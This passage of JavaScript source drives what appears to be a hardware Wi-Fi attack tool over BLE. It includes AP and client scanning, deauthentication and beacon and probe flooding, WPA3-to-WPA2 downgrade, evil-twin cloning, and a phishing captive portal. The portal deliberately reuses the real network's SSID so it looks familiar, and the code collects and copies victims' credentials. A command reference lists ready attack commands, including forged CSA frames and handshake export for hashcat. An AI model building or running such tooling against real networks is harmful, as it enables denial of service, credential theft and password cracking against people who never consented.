    log('开始嗅探发现 AP (' + secs + 's)…', 'warn');
    toast('正在扫描附近 AP…', 'warn');
    sendCmd('sniff auto --dwell 200');
    setTimeout(() => {
        if (!apScanning) return;
        sendCmd('stop');
        dumpAps();
    }, secs * 1000);
    /* 兜底: 万一 stop/dump 回包丢失, 也要让 UI 收尾 */
    setTimeout(() => { if (apScanning) finishApScan(); }, secs * 1000 + 3000);
}

/* 嗅探结束 -> 拉取设备端追踪表 */
function dumpAps(){
    apExpect = -1;
    log('读取 AP 列表…', 'warn');
    apScanState('读取设备端列表…');
    sendCmd('dump aps');
    if (apScanTimer) clearInterval(apScanTimer);
    apScanTimer = setInterval(() => { if (apScanning) finishApScan(); }, 2500);
}

function finishApScan(){
    const wasScanning = apScanning;
    apScanning = false;
    if (apScanTimer){ clearInterval(apScanTimer); apScanTimer = null; }
    if (wasScanning){ radar('apRadar', false); setJobActive(false); }
    apScanState(apList.length
        ? ('完成 · 发现 ' + apList.length + ' 个 AP')
        : '完成 · 未发现 AP，靠近热点后重试');
    renderApList();
}

/* 客户端列表来自设备端追踪表, 而该表只在被动嗅探数据帧时才被填充:
 * wifi_db_update_client() 仅处理 FC_TYPE_DATA. 所以必须先嗅探一段时间,
 * 再 dump clients, 否则永远是空表. */
function scanClients(secs){
    if (!connected){ toast('请先连接设备', 'err'); return; }
    if (cliScanning){ toast('扫描进行中', 'warn'); return; }
    if (typeof secs !== 'number' || !isFinite(secs) || secs <= 0) secs = 8;
    cliScanning = true;
    cliExpect = -1;
    clientList.length = 0;
    renderClientList();
    radar('cliRadar', true);
    $('cliPanel')?.classList.add('open');
    $('cliList').innerHTML =
        '<div class="list-empty">正在嗅探数据帧以发现客户端…</div>';
    $('cliCount').textContent = '扫描中…';

    cliScanLeft = secs;
    cliScanState('嗅探中 ' + cliScanLeft + 's · 已发现 0 个');
    if (cliScanTimer) clearInterval(cliScanTimer);
    cliScanTimer = setInterval(() => {
        cliScanLeft--;
        if (cliScanning) {
            cliScanState('嗅探中 ' + Math.max(cliScanLeft, 0) + 's · 已发现 ' +
                         clientList.length + ' 个');
        }
        if (cliScanLeft <= 0){ clearInterval(cliScanTimer); cliScanTimer = null; }
    }, 1000);

    log('开始嗅探发现客户端 (' + secs + 's)…', 'warn');
    toast('正在扫描客户端…', 'warn');
    sendCmd('sniff auto --dwell 200');
    setTimeout(() => {
        if (!cliScanning) return;
        sendCmd('stop');
        dumpClients();
    }, secs * 1000);
    setTimeout(() => { if (cliScanning) finishCliScan(); }, secs * 1000 + 3000);
}

/* 仅刷新: 直接拉取设备端已有的追踪表 (不重新嗅探) */
function dumpClients(){
    if (!connected){ toast('请先连接设备', 'err'); return; }
    cliExpect = -1;
    cliScanState('读取设备端列表…');
    sendCmd('dump clients');
    if (cliDumpFallback) clearTimeout(cliDumpFallback);
    cliDumpFallback = setTimeout(() => { if (cliScanning) finishCliScan(); }, 2500);
}

function finishCliScan(){
    cliScanning = false;
    cliExpect = -1;
    if (cliScanTimer){ clearInterval(cliScanTimer); cliScanTimer = null; }
    if (cliDumpFallback){ clearTimeout(cliDumpFallback); cliDumpFallback = null; }
    radar('cliRadar', false);
    cliScanState(clientList.length
        ? ('完成 · ' + clientList.length + ' 个客户端')
        : '完成 · 未发现客户端（让设备多产生流量后重试）');
    renderClientList();
}

/* AP 能力徽标: AKM / 密码套件 / 带宽 / 制式 / PMF / WPS / 可否离线破 */
function apCapsHtml(ap){
    const c = ap.caps || {};
    const out = [];
    if (c.akm && c.akm !== '-') out.push(c.akm);
    if (c.cip && c.cip !== '-') out.push(c.cip);
    if (c.bw) out.push(c.bw + 'MHz');
    if (c.std) out.push(c.std);
    if (ap.pmf) out.push('<b>PMF必需</b>');
    else if (c.pmfc === '1') out.push('PMF可');
    if (c.wps === '1') out.push('<b>WPS</b>');
    out.push(c.crk === '1' ? '<b>可破</b>' : '不可破');
    return out.map(s => `<span>${s}</span>`).join('');
}

function renderApList(){
    const list = $('apList');
    const keyword = ($('apSearch')?.value || '').toLowerCase();
    if (apList.length === 0){
        list.innerHTML = '<div class="list-empty">未发现 AP · 点「快速扫描」重试，或靠近热点</div>';
        $('apCount').textContent = '0 个 AP';
        return;
    }
    const filtered = keyword
        ? apList.filter(a => a.ssid.toLowerCase().includes(keyword) || a.bssid.toLowerCase().includes(keyword) || String(a.channel).includes(keyword))
        : apList;
    if (filtered.length === 0){
        list.innerHTML = '<div class="list-empty">未发现匹配的 AP</div>';
        $('apCount').textContent = apList.length + ' 个 AP';
        return;
    }
    list.innerHTML = '';
    const sorted = [...filtered].sort((a,b) => b.rssi - a.rssi);
    for (let i=0; i<sorted.length; i++){
        const ap = sorted[i];
        const item = document.createElement('div');
        item.className = 'list-item' + (selectedAp && selectedAp.bssid === ap.bssid ? ' selected' : '');
        item.style.animationDelay = (i * 20) + 'ms';
        const rssiIcon = ap.rssi > -50 ? '▰' : ap.rssi > -70 ? '▱' : '▯';
        item.innerHTML = `
            <div class="ic">${rssiIcon}</div>
            <div class="nm">
                <div class="ssid">${ap.ssid}${ap.hidden ? ' <span style="color:var(--faint);font-size:9px;">[HIDDEN]</span>' : ''}</div>
                <div class="meta">
                    <span>${ap.bssid}</span>
                    <span>CH ${ap.channel}</span>
                    <span>${ap.enc}</span>
                    <span>${ap.vendor}</span>
                </div>
                <div class="meta" style="margin-top:2px">${apCapsHtml(ap)}</div>
            </div>
            <div class="rssi">${ap.rssi} dBm</div>
        `;
        item.addEventListener('click', () => selectAp(ap));
        item.addEventListener('long-press', () => copyText(ap.bssid));
        item.addEventListener('touchstart', e => item._pressT = Date.now());
        item.addEventListener('touchend', e => { if (Date.now()-item._pressT > 500) copyText(ap.bssid); });
        list.appendChild(item);
    }
    $('apCount').textContent = filtered.length + ' 个 AP' + (keyword ? ` (共 ${apList.length})` : '');
    window.RFRefreshPicks?.();
}

$('apSearch')?.addEventListener('input', renderApList);

function copyText(text){
    navigator.clipboard?.writeText(text).then(() => toast('已复制: ' + text, 'ok')).catch(()=>{});
}

function selectAp(ap){
    selectedAp = ap;
    renderApList();
    $('deauthBssid').value = ap.bssid;
    $('downgradeSsid').value = ap.ssid === '(hidden)' ? '' : ap.ssid;
    /* 门户 SSID 直接跟随选中目标，假热点用真热点同名, 用户不用再手打,
     * 手机扫到的也就是熟悉的那个名字. */
    if (ap.ssid && ap.ssid !== '(hidden)') $('phishSsid').value = ap.ssid;
    /* 全局目标选中后, 其它页的取目标字段一并写好, 用户不用逐页重挑 */
    $('scBssid').value = ap.bssid;
    $('locMac').value = ap.bssid;
    $('ftmBssid').value = ap.bssid;
    const fsel = $('ftmApSelect');
    if (fsel && [...fsel.options].some(o => o.value === ap.bssid)) fsel.value = ap.bssid;
    $('deauthTargetHint').innerHTML = `已选择: <b>${ap.ssid}</b> · ${ap.bssid} · CH ${ap.channel} · ${ap.vendor || '厂商未知'}`;
    $('downgradeTargetHint').innerHTML = `已选择: <b>${ap.ssid}</b> · CH ${ap.channel} · ${ap.vendor || '厂商未知'}`;
    const ph = $('phishTargetHint');
    if (ph) ph.innerHTML = `门户 SSID 已跟随目标: <b>${ap.ssid}</b> · CH ${ap.channel} · ${ap.vendor || '厂商未知'}`;
    const et = $('etHint');
    if (et) et.innerHTML = `已选目标: <b>${ap.ssid}</b> · ${ap.bssid} · CH ${ap.channel} · ${ap.vendor || '厂商未知'}`;
    const st = $('scanTargetHint');
    if (st) st.innerHTML = `当前目标: <b>${ap.ssid}</b> · ${ap.bssid} · CH ${ap.channel} · ${ap.enc} · ${ap.rssi}dBm · ${ap.vendor || '厂商未知'}`;
    log('目标已设为 ' + ap.ssid + ' (' + ap.bssid + ' · ' + (ap.vendor || '?') + ')', 'ok');
    toast('目标: ' + ap.ssid, 'ok');
    window.RFSyncTarget?.();
}

/*
   客户端列表渲染
 */
/* RSSI 趋势: 16 段单色竖条 (-30 满格, -95 空格), 用来判断目标在靠近还是走远 */
function rssiTrendHtml(c){
    const h = c.hist;
    if (!h || h.length < 2) return '';
    const bars = h.map(v => {
        const n = Math.max(0, Math.min(7, Math.round((v + 95) / (95 - 30) * 7)));
        return '▁▂▃▄▅▆▇█'[n];
    }).join('');
    const first = h[0], last = h[h.length - 1];
    const d = last - first;
    const trend = Math.abs(d) < 3 ? '→' : (d > 0 ? '↑' : '↓');
    return `<div class="meta" style="margin-top:2px"><span title="${h.join(' ')}">` +
           `${bars} ${trend} ${d > 0 ? '+' : ''}${d}dB</span></div>`;
}

function renderClientList(){
    const list = $('cliList');
    if (clientList.length === 0){
        list.innerHTML = '<div class="list-empty">未发现已关联客户端</div>';
        $('cliCount').textContent = '0 个客户端';
        return;
    }
    list.innerHTML = '';
    const sorted = [...clientList].sort((a,b) => b.pkts - a.pkts);
    for (let i=0; i<sorted.length; i++){
        const c = sorted[i];
        const item = document.createElement('div');
        item.className = 'list-item' + (selectedClient && selectedClient.mac === c.mac ? ' selected' : '');
        item.style.animationDelay = (i * 20) + 'ms';
        item.innerHTML = `
            <div class="ic">▸</div>
            <div class="nm">
                <div class="ssid">${c.mac}</div>
                <div class="meta">
                    <span>BSSID ${c.bssid}</span>
                    <span>${c.vendor}</span>
                    <span>${c.pkts} pkts</span>
                </div>
                ${rssiTrendHtml(c)}
            </div>
            <div class="rssi">${c.rssi} dBm</div>
        `;
        item.addEventListener('click', () => selectClient(c));
        list.appendChild(item);
    }
    $('cliCount').textContent = clientList.length + ' 个客户端';
    window.RFRefreshPicks?.();
}

function selectClient(c){
    selectedClient = c;
    renderClientList();
    $('deauthSta').value = c.mac;
    log('STA 已设为 ' + c.mac + ' (' + c.vendor + ')', 'ok');
    toast('STA: ' + c.mac.slice(-8), 'ok');
    window.RFSyncTarget?.();
}

/*
   标签页切换
 */
function gotoTab(name){
    const t = document.querySelector('.tab[data-tab="' + name + '"]');
    if (t) t.click();
    /* 工具页: 打开时把已扫描 AP 灌进 FTM 目标下拉 */
    if (name === 'tools') renderFtmApSelect();
}
document.querySelectorAll('.tab').forEach(t => {
    t.addEventListener('click', () => {
        document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
        document.querySelectorAll('.panel').forEach(x => x.classList.remove('active'));
        t.classList.add('active');
        $('pan-' + t.dataset.tab).classList.add('active');
        moveTabInd();
    });
});
/* 指示器跟随滚动/尺寸变化 */
$('tabs')?.addEventListener('scroll', moveTabInd, { passive:true });
window.addEventListener('resize', () => { moveTabInd(); }, { passive:true });
window.addEventListener('orientationchange', () => setTimeout(moveTabInd, 240), { passive:true });

/*
   命令按钮
 */
$('btnSniff').addEventListener('click', () => {
    const ch = $('sniffCh').value;
    const cnt = $('sniffCount').value;
    const dwell = $('sniffDwell').value;
    expectConfirm('嗅探', 6000);
    if (ch === 'auto') sendCmd(`sniff auto --dwell ${dwell}`);
    else sendCmd(`sniff ${ch} -n ${cnt}`);
});

const stopAll = () => { clearPendingAction(); sendCmd('stop'); toast('已发送停止', 'warn'); };
$('btnStop').addEventListener('click', stopAll);
$('btnStop2').addEventListener('click', stopAll);
$('btnStop3').addEventListener('click', stopAll);
$('btnStop4').addEventListener('click', stopAll);
$('btnScanApStop').addEventListener('click', stopAll);

/* 扫描页 */
$('btnScanApFast').addEventListener('click', () => scanAps(6));
$('btnScanApDeep').addEventListener('click', () => scanAps(15));
$('btnApRefresh').addEventListener('click', () => dumpAps());
$('btnCliScan').addEventListener('click', () => scanClients(8));
$('btnCliRefresh').addEventListener('click', () => dumpClients());
$('btnCliClear').addEventListener('click', () => {
    clientList.length = 0;
    finishCliScan();
    toast('本地客户端列表已清空', 'ok');
});

let deauthTarget = '';   /* 最近一次 deauth 的目标 BSSID */

$('btnDeauth').addEventListener('click', () => {
    const bssid = $('deauthBssid').value.trim();
    if (!bssid){ toast('请选择目标 BSSID', 'err'); return; }
    const sta = $('deauthSta').value.trim();
    const cnt = $('deauthCount').value;
    const reason = $('deauthReason').value;
    const interval = $('deauthInterval').value;
    let cmd = `deauth -b ${bssid} -n ${cnt} -r ${reason} -i ${interval}`;
    if (sta && sta !== '00:00:00:00:00:00') cmd += ` -s ${sta}`;
    /* 固件对危险命令强制要 --yes, 缺了只回一条 META 拒绝而不执行。
     * 不用 window.confirm: Capacitor 的 WebView 没实现 onJsConfirm,
     * confirm() 恒返回 false, 按钮会全死。专用页面点按钮即为明确意图。 */
    cmd += ' --yes';
    log('发送破坏性命令: ' + cmd, 'warn');
    deauthTarget = bssid;          /* 供 DONE 后转入握手等待时比对 */
    clearHandshake();              /* 上一轮没结束的等待作废, 否则旧计时器会在中途报超时 */
    expectConfirm('Deauth', 8000);
    sendCmd(cmd);
});
/* BSSID 格式即时校验: 非法时输入框变红, 但不阻断已有流程 */
$('deauthBssid').addEventListener('input', () => {
    const v = ($('deauthBssid').value || '').trim();
    if (!v){ $('deauthBssid').classList.remove('inval'); return; }
    markValid('deauthBssid', isMac(v));
});

$('btnBeacon').addEventListener('click', () => {
    const prefix = $('beaconPrefix').value.trim();
    const cnt = $('beaconCount').value;
    const interval = $('beaconInterval').value;
    expectConfirm('Beacon', 8000);
    sendCmd(`beaconflood -p "${prefix}" -n ${cnt} -i ${interval} --yes`);
});

$('btnProbe').addEventListener('click', () => {
    const cnt = $('probeCount').value;
    const interval = $('probeInterval').value;
    expectConfirm('Probe', 8000);
    sendCmd(`probeflood -n ${cnt} -i ${interval} --yes`);
});

$('btnDowngrade').addEventListener('click', () => {
    const ssid = $('downgradeSsid').value.trim();
    if (!ssid){ toast('请选择目标 AP', 'err'); return; }
    const pass = $('downgradePass').value.trim();
    let cmd = `downgrade "${ssid}"`;
    if (pass) cmd += ` --pass "${pass}"`;
    cmd += ' --yes';
    expectConfirm('降级', 8000);
    sendCmd(cmd);
});

/*
   原始 CLI (含命令历史)
 */
let cmdHistory = [];
let histIdx = -1;

$('btnRaw').addEventListener('click', () => {
    const cmd = $('rawCmd').value.trim();
    if (cmd){
        if (cmdHistory[cmdHistory.length-1] !== cmd) cmdHistory.push(cmd);
        if (cmdHistory.length > 50) cmdHistory.shift();
        histIdx = cmdHistory.length;
        /* 手敲的 deauth 也要记住目标, 否则 DONE 之后没法判断哪台 AP 的
         * 握手才算这条命令的结果 */
        const m = cmd.match(/^deauth\b.*-b\s+([0-9a-fA-F:]{17})/);
        if (m) deauthTarget = m[1];
        sendCmd(cmd);
        $('rawCmd').value = '';
    }
});
$('btnStatus').addEventListener('click', () => sendCmd('status'));
$('rawCmd').addEventListener('keydown', e => {
    if (e.key === 'Enter'){ $('btnRaw').click(); }
    else if (e.key === 'ArrowUp'){
        e.preventDefault();
        if (cmdHistory.length > 0){
            histIdx = Math.max(0, histIdx - 1);
            $('rawCmd').value = cmdHistory[histIdx] || '';
        }
    } else if (e.key === 'ArrowDown'){
        e.preventDefault();
        if (cmdHistory.length > 0){
            histIdx = Math.min(cmdHistory.length, histIdx + 1);
            $('rawCmd').value = cmdHistory[histIdx] || '';
        }
    }
});

/*
   指令速查
   用法串与 main/cli.c 的 g_cmds[].usage 及各 cmd_* 的 usage 文本对齐;
   改固件命令必须同步改这张表, 否则速查会教人发不存在的参数.
 */
const CLI_REF = [
    { g:'基础', items:[
        { c:'help',                        d:'设备支持的命令与用法' },
        { c:'version',                     d:'固件版本' },
        { c:'status',                      d:'状态与计数器 (App 每 3s 自动拉一次)' },
        { c:'health',                      d:'堆、任务数、各模块自检' },
        { c:'log',                         d:'板载日志环形缓冲; log clear 清空' },
        { c:'events 20',                   d:'事件总线最近 20 条' },
        { c:'config list',                 d:'NVS 配置; set 键 值 / get 键 / reset' },
    ]},
    { g:'扫描与嗅探', items:[
        { c:'sniff 6',                     d:'定信道嗅探, -n 0 表示不限包数' },
        { c:'sniff auto --dwell 300',      d:'全信道轮询, 按各信道发现数排序; --policy wrl 用旧的帧率加权' },
        { c:'stop',                        d:'停嗅探 / 注入 / 降级' },
        { c:'dump aps',                    d:'读设备端 AP 表; clients / eapols / all / clear' },
        { c:'export csv',                  d:'全量导出; 也可 json' },
        { c:'hs',                          d:'握手归档; complete 只列可破解, 22000 出 hashcat' },
        { c:'hs selftest',                 d:'握手配对自检 (RC 一致性)' },
        { c:'pmkid watch 6',               d:'被动等 PMKID; 也可 watch 加 BSSID' },
        { c:'pmkid active 20:87:ec:0f:4e:82 --yes', d:'主动关联一次取 M1; AP 支持才有 PMKID', danger:true },
        { c:'raw csa 20:87:ec:0f:4e:82 1 3 --yes', d:'伪造 CSA 把客户端赶到指定信道; PMF 挡不住', danger:true },
        { c:'locate AA:BB:CC:DD:EE:FF 30', d:'RSSI 测向 30s; status / stop / export' },
    ]},
    { g:'注入', items:[
        { c:'deauth -b AA:BB:CC:DD:EE:FF -n 10 -r 7 -i 100 --yes', d:'踢客户端; 不带 -s 为广播。目标必须先在 AP 表里', danger:true },
        { c:'beaconflood -p "FreeWiFi" -n 500 -i 20 --yes',         d:'Beacon 洪泛, -c 指定信道', danger:true },
        { c:'probeflood -n 500 -i 20 --yes',                        d:'Probe 请求洪泛', danger:true },
        { c:'downgrade "MySSID" --yes',                             d:'WPA3→WPA2 降级 AP 并抓握手', danger:true },
        { c:'eviltwin clone AA:BB:CC:DD:EE:FF --yes',               d:'克隆 SSID+BSSID+信道; push 追加 deauth', danger:true },
        { c:'raw tx 8000...',                                       d:'原始帧; 子命令 tx / deauth / auth / assoc / beacon / proberesp' },
        { c:'karma follow 2',                                       d:'按探针请求改门户 SSID; follow 0 关闭' },
    ]},
    { g:'门户与落盘', items:[
        { c:'phish start "FreeWiFi"',      d:'起钓鱼门户; stop / status / stations / creds' },
        { c:'phish html size',             d:'自定义页面; clear / begin 字节数 / end' },
        { c:'cap start key',               d:'原始帧落 Flash (仅关键帧); info / keys / read 偏移 长度' },
        { c:'cap stop',                    d:'停止落盘, 回执带帧数与丢帧' },
    ]},
    { g:'无线扩展', items:[
        { c:'blescan start',               d:'板载 BLE 扫描; stop / clear' },
        { c:'ble power 15',                d:'BLE 发射功率 0-15 (15=+20dBm)' },
        { c:'bleadv eddystone https://a.b', d:'BLE 广播伪造; ibeacon UUID major minor / stop / status' },
        { c:'zbsniff 15',                  d:'802.15.4 嗅探 (11-26); status / dump / clear' },
        { c:'ftm range AA:BB:CC:DD:EE:FF 6 8', d:'FTM 测距; 第 2 参数是信道, 目标不在表里时必须给' },
    ]},
    { g:'编排与系统', items:[
        { c:'scenario survey 15',          d:'一轮勘察; handshake 目标BSSID / pmf 目标BSSID / status / stop' },
        { c:'ota status',                  d:'双区 OTA; confirm / rollback / url 地址 / reboot' },
        { c:'http start',                  d:'板载 REST 服务; status / stop' },
    ]},
];

function renderCliRef(filter){
    const box = $('cmdRef');
    if (!box) return;
    const f = (filter || '').toLowerCase();
    /* 说明里可能出现 < > 之类的字符, 不转义会被当成标签吞掉 */
    const esc = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;')
                             .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    let html = '', shown = 0;
    for (const grp of CLI_REF){
        const rows = grp.items.filter(it =>
            !f || (it.c + ' ' + it.d + ' ' + grp.g).toLowerCase().includes(f));
        if (!rows.length) continue;
        html += '<div class="crt-group">' + esc(grp.g) + '</div>';
        for (const it of rows){
            shown++;
            html += '<div class="crt" data-cmd="' + esc(it.c) + '">' +
                        '<code class="' + (it.danger ? 'dg' : '') + '">' + esc(it.c) + '</code>' +
                        '<span>' + (it.danger ? '需 --yes · ' : '') + esc(it.d) + '</span>' +
                    '</div>';
        }
    }
    box.innerHTML = shown ? html : '<div class="list-empty">没有匹配的指令</div>';
}

$('cmdSearch').addEventListener('input', e => renderCliRef(e.target.value));
$('cmdRef').addEventListener('click', e => {
    const row = e.target.closest('.crt');
    if (!row) return;
    $('rawCmd').value = row.dataset.cmd;
    $('rawCmd').focus();
    toast('已填入, 可改参数后执行', 'ok');
});

/*
   数据面板 / 诊断
 */
function doDump(what, label){
    if (!connected){ toast('请先连接设备', 'err'); return; }
    log('[数据] 拉取 ' + label + '...', 'warn');
    toast('正在拉取 ' + label, 'warn');
    if (what === 'aps'){ apList.length = 0; }
    if (what === 'clients'){ clientList.length = 0; }
    sendCmd('dump ' + what);
}
$('btnDumpAps').addEventListener('click', () => doDump('aps', 'AP 列表'));
$('btnDumpClis').addEventListener('click', () => doDump('clients', '客户端列表'));
$('btnDumpEapols').addEventListener('click', () => doDump('eapols', 'EAPOL 列表'));
$('btnDumpAll').addEventListener('click', () => doDump('all', '全部数据'));

/*
   文件保存 — 让用户自己选目录
   1) 桌面 Chrome/Edge: 系统「另存为」对话框 (可自选目录 + 文件名)
   2) Android (Capacitor): 先写应用缓存, 再拉起系统分享面板,
      "保存到文件 / 存储" 即可自选目录 (免存储权限)
   3) 兜底: 触发浏览器下载
 */
let exportCap = null;   /* 导出载荷采集缓冲 { fmt, lines[] } */

function stamp(){
    const d = new Date(), p = n => String(n).padStart(2, '0');
    return d.getFullYear() + p(d.getMonth() + 1) + p(d.getDate()) + '-' +
           p(d.getHours()) + p(d.getMinutes()) + p(d.getSeconds());
}

/* Uint8Array -> base64 (分块, 避免 apply 参数上限) */
function uint8ToBase64(bytes){
    let s = '';
    const CH = 0x8000;
    for (let i = 0; i < bytes.length; i += CH){
        s += String.fromCharCode.apply(null, bytes.subarray(i, Math.min(i + CH, bytes.length)));
    }
    return btoa(s);
}

async function saveFile(filename, data, mime){
    const Cap = window.Capacitor;
    const Plug = (Cap && Cap.Plugins) || {};
    const FS = Plug.Filesystem, SH = Plug.Share;
    const ext = filename.split('.').pop();
    const isBin = (data instanceof Uint8Array) || (data instanceof ArrayBuffer);

    /* 1) 桌面: 原生另存为 */
    if (window.showSaveFilePicker){
        try {
            const h = await window.showSaveFilePicker({
                suggestedName: filename,
                types: [{ description: mime, accept: { [mime]: ['.' + ext] } }]
            });
            const w = await h.createWritable();
            await w.write(new Blob([data], { type: mime }));
            await w.close();
            toast('已保存 ' + filename, 'ok');
            return true;
        } catch(e){
            if (e && e.name === 'AbortError'){ toast('已取消保存', 'warn'); return false; }
            dlog('showSaveFilePicker 失败: ' + (e && e.message));
        }
    }

    /* 2) Android: 缓存 + 系统分享面板 (可选目录) */
    if (FS && SH){
        try {
            const res = await FS.writeFile({
                path: filename,
                data: isBin ? uint8ToBase64(data) : data,
                directory: 'CACHE',
                encoding: isBin ? 'base64' : 'utf8'
            });
            await SH.share({ title: filename, files: [res.uri], dialogTitle: '保存或分享 ' + filename });
            toast('已交给系统保存', 'ok');
            return true;
        } catch(e){
            dlog('原生保存失败: ' + (e && e.message));
        }
    }

    /* 3) 兜底 */
    try {
        const a = document.createElement('a');
        a.href = URL.createObjectURL(new Blob([data], { type: mime }));
        a.download = filename;
        a.click();
        setTimeout(() => URL.revokeObjectURL(a.href), 4000);
        toast('已触发下载 ' + filename, 'ok');
        return true;
    } catch(e){
        toast('保存失败: ' + (e && e.message), 'err');
        return false;
    }
}

$('btnExportCsv').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    toast('正在导出 CSV...', 'warn');
    sendCmd('export csv');
});
$('btnExportJson').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    toast('正在导出 JSON...', 'warn');
    sendCmd('export json');
});

$('btnHttpStart').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    expectConfirm('板载服务', 8000);
    sendCmd('http start');
});
$('btnHttpStatus').addEventListener('click', () => sendCmd('http status'));
$('btnHttpStop').addEventListener('click', () => { sendCmd('http stop'); toast('已请求停止', 'warn'); });

$('btnHelp').addEventListener('click', () => sendCmd('help'));
$('btnVersion').addEventListener('click', () => sendCmd('version'));
$('btnResetStats').addEventListener('click', () => { sendCmd('status'); toast('已刷新状态', 'ok'); });
$('btnClearAp').addEventListener('click', () => {
    apList.length = 0;
    renderApList();
    toast('本地 AP 列表已清空', 'ok');
});

/* 外部链接: Capacitor 里 window.open 没有窗口管理器支撑, 点了不会有反应.
 * 改成主框架导航, 让原生 shouldOverrideUrlLoading 拦下交给系统浏览器:
 * Capacitor 对非同源 URL 直接 startActivity 并返回 true, WebView 不跳走,
 * BLE 连接保持. 桌面浏览器没有这层拦截, 才用 window.open. */
function openExternal(url){
    if (window.Capacitor){ window.location.href = url; return; }
    window.open(url, '_blank', 'noopener');
}
for (const id of ['btnRepo', 'btnRelease']){
    $(id).addEventListener('click', e => openExternal(e.currentTarget.dataset.url));
}

/*
   钓鱼门户 (Captive Portal)
 */
$('btnPhishStart').addEventListener('click', () => {
    const ssid = ($('phishSsid').value || '').trim() || 'Free-WiFi';
    const pass = ($('phishPass').value || '').trim();
    expectConfirm('门户', 12000);
    sendCmd('phish start "' + ssid.replace(/"/g, '') + '"' + (pass ? ' "' + pass.replace(/"/g, '') + '"' : ''));
});
$('btnPhishStatus').addEventListener('click', () => sendCmd('phish status'));
$('btnPhishStop').addEventListener('click', () => {
    clearPendingAction();
    setJobActive(false);
    sendCmd('phish stop');
    toast('已发送停止', 'warn');
});

$('btnPhishHtmlSize').addEventListener('click', () => sendCmd('phish html size'));
$('btnPhishHtmlClear').addEventListener('click', () => {
    sendCmd('phish html clear');
    toast('已请求恢复内置模板', 'warn');
});

$('btnPhishUpload').addEventListener('click', async () => {
    const fi = $('phishHtmlFile');
    if (!fi || !fi.files || !fi.files[0]){ toast('请先选择 HTML 文件', 'err'); return; }
    if (!connected){ toast('请先连接设备', 'err'); return; }
    const file = fi.files[0];
    if (file.size > 1024 * 1024){ toast('文件超过 1 MB 上限', 'err'); return; }
    if (file.size < 16){ toast('文件过小', 'err'); return; }

    const bar = $('phishUpBar'), txt = $('phishUpTxt'), btn = $('btnPhishUpload');
    btn.classList.add('loading');
    setJobActive(true);
    txt.textContent = '读取文件…';
    try {
        const buf = new Uint8Array(await file.arrayBuffer());
        const t0 = Date.now();
        txt.textContent = '上传中 0 / ' + buf.length + ' B';
        await nusUploadHtml(buf, (done, total) => {
            const pct = Math.round(done * 100 / total);
            if (bar) bar.style.width = pct + '%';
            txt.textContent = '上传中 ' + done + ' / ' + total + ' B (' + pct + '%)';
        });
        const secs = ((Date.now() - t0) / 1000).toFixed(1);
        if (bar) bar.style.width = '100%';
        txt.textContent = '已发送 ' + buf.length + ' B / ' + secs + 's，等待设备确认…';
        log('[门户] 已上传 ' + file.name + ' (' + buf.length + ' B, ' + secs + 's)', 'ok');
    } catch(e){
        log('上传失败: ' + e.message, 'err');
        toast('上传失败: ' + e.message, 'err');
        txt.textContent = '上传失败';
    } finally {
        btn.classList.remove('loading');
        setJobActive(false);
        sendCmd('phish html size');   /* 回读设备端实际大小 */
    }
});

$('btnCredRefresh').addEventListener('click', () => sendCmd('phish creds'));
$('btnPhishSta').addEventListener('click', () => sendCmd('phish stations'));
$('btnCredClear').addEventListener('click', () => {
    sendCmd('phish creds clear');
    phishCredCount = 0; phishCreds = []; phishCredCur = null;
    radar('credRadar', false);
    updatePhishUI(); renderCreds();
});
$('btnCredCopy').addEventListener('click', () => {
    if (phishCreds.length === 0){ toast('暂无凭据', 'warn'); return; }
    const txt = phishCreds.map(c =>
        '#' + c.id + '  ' + c.ip + '\n' +
        c.fields.map(f => '  ' + f.k + ' = ' + f.v).join('\n')
    ).join('\n\n');
    copyText(txt);
});

/*
   日志控制
 */
/* 自动滚动开关 */
$('btnLogAuto').addEventListener('click', () => {
    logAuto = !logAuto;
    $('btnLogAuto').classList.toggle('on', logAuto);
    if (logAuto) logBox.scrollTop = logBox.scrollHeight;
    toast('自动滚动' + (logAuto ? '已开启' : '已关闭'), logAuto ? 'ok' : 'warn');
});
$('btnClearLog').addEventListener('click', () => {
    logBox.innerHTML = '';
    logBuffer = [];
    toast('日志已清空', 'ok');
});
$('btnExportLog').addEventListener('click', () => {
    const text = [...logBox.querySelectorAll('.line')].map(l => l.textContent).join('\n');
    if (!text){ toast('日志为空', 'warn'); return; }
    saveFile('rftool-log-' + stamp() + '.txt', text, 'text/plain');
});

/*
   原始帧落盘 (cap) — 分段拉取 + 板载回传完整 pcap
   两条通道分工:
     · BLE 分段拉取: 关键帧 (EAPOL/PMKID/Deauth) 只有几条到几百条,
       体积小, 按 [offset,len] 逐片拉, 每片等固件回 META,CAP,READ 再发下一片.
     · 板载 HTTP: 完整 pcap 可能几 MB, 走 192.168.71.1/api/cap/pcap 原生下载.
 */
/* 关键帧类型位 -> 可读名 */
function capKindName(k){
    const p = [];
    if (k & 1) p.push('EAPOL');
    if (k & 2) p.push('PMKID');
    if (k & 4) p.push('DEAUTH');
    if (k & 8) p.push('EAPOL-Key');
    return p.length ? p.join('+') : ('kind' + k);
}

function fmtBytes(n){
    n = Number(n) || 0;
    if (n >= 1048576) return (n / 1048576).toFixed(2) + ' MB';
    if (n >= 1024)    return (n / 1024).toFixed(1) + ' KB';
    return n + ' B';
}

function updateCapUI(){
    const set = (id, v) => { const el = $(id); if (el) el.textContent = v; };
    set('capState', capSt.on ? (capSt.keyonly ? '落盘中 · 仅关键帧' : '落盘中')
                             : (capSt.full ? '已写满' : '空闲'));
    set('capFrames', String(capSt.frames));
    set('capBytes', fmtBytes(capSt.bytes));
    set('capKeys', String(capSt.keys));
    set('capDrops', String(capSt.drops));
    set('capCap', capSt.cap ? fmtBytes(capSt.cap) : '--');
    const b = $('btnCapStart');
    if (b) b.textContent = capSt.on ? '重新开始' : '开始落盘';
    const kc = $('capKeyOnly');
    if (kc) kc.checked = capSt.keyonly;
}

function setCapProg(done, total, label){
    const bar = $('capProg'), txt = $('capProgTxt');
    if (bar) bar.style.width = (total > 0 ? Math.min(100, done / total * 100) : 0).toFixed(1) + '%';
    if (txt) txt.textContent = label + (total > 0 ? ' · ' + done + '/' + total : '');
}

/* 等固件回 META,CAP,READ 收尾行，这就是流控点: 一片没完成不发下一片 */
